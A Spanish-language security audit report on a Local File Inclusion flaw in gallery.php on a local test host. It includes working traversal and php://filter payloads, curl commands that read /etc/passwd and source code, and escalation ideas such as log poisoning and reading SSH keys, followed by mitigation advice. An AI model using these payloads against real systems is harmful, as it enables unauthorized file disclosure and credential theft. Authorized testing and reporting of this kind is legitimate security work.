# Informe de Auditoría LFI — web.dev.local:8081

Fecha: 2026-04-27T08:17:29Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Fue posible leer archivos sensibles del sistema (ej. `/etc/passwd`) usando traversal y el wrapper `php://filter`. Estado: VULN_FOUND: true, VULN_EXPLOITED: true

Descubrimiento y reconocimiento
--------------------------------
Comandos de reconocimiento ejecutados (Kali/MCP):
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q
- dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt
- nikto -h http://web.dev.local:8081

Se inspeccionó `index.php` y se encontró que los enlaces a categorías usan `gallery.php?page=...`, lo cual identifica `page` como punto de entrada dinámico.

Pruebas de LFI realizadas (payloads y resultados)
-------------------------------------------------
Pruebas directas de traversal:
- GET "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
  Resultado: Contenido de /etc/passwd devuelto en la respuesta HTML. Ejemplo (fragmento):

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- GET "http://web.dev.local:8081/gallery.php?page=modern" (página legítima para comparación)
  Resultado: Contenido normal de la galería.

Uso de php://filter para evadir filtros / visualizar contenido fuente:
- GET "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd"
  Resultado: La respuesta incluyó una cadena Base64 que decodificada contiene `/etc/passwd` completo. Ejemplo de Base64 devuelto (truncado):
  cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==

- GET "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=index.php"
  Resultado: Base64 del código fuente de index.php fue devuelto (confirmando lectura de ficheros por wrapper php://filter).

Evidencias relevantes
----------------------
- Archivo leído con éxito: /etc/passwd (contenido presente en la respuesta).
- Lectura base64 de otros recursos (index.php) mediante php://filter.

Impacto y alcance
------------------
- Divulgación de información: la capacidad de leer `/etc/passwd` confirma acceso a archivos locales y por tanto exposición de cuentas del sistema y posibles pistas para escalada.
- Escalada potencial: con LFI confirmado, un atacante podría intentar:
  * Leer `/etc/shadow` (si permisos permiten) o claves privadas (ej. ~/.ssh/id_rsa).
  * Realizar Log Poisoning para lograr RCE (por ejemplo, inyectando PHP en logs y luego incluyendo el log con LFI).
  * Usar wrappers (expect://, data://, php://input, etc.) para ejecutar/inyectar más payloads según configuración del servidor PHP.

Comandos exactos para reproducir (ejemplos con curl)
-----------------------------------------------------
1) Reconocimiento rápido:
   gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q
2) Confirmación LFI (traversal):
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
3) Confirmación via php://filter (base64):
   curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd" | sed -n '1,40p'

Recomendaciones de mitigación
-----------------------------
- Validar y sanear/whitelistear los parámetros que se usan para incluir ficheros: usar una lista de archivos permitidos y mapear aliases a nombres de fichero en servidor.
- Evitar incluir directamente contenido controlado por el usuario; usar rutas absolutas y `realpath()` y comprobar que el fichero final está dentro del directorio esperado.
- Desactivar wrappers peligrosos si no son necesarios y minimizar permisos de los archivos sensibles (evitar que el usuario del web server pueda leer ficheros críticos).
- Habilitar logging y alertas en accesos inesperados a ficheros sensibles.

Conclusión
----------
La aplicación `gallery.php` es vulnerable a LFI via el parámetro `page`. Se obtuvo con éxito `/etc/passwd` y lecturas base64 de ficheros de la aplicación, lo que confirma tanto la presencia de la vulnerabilidad como su explotación práctica en este entorno autorizado.


— Fin del informe —
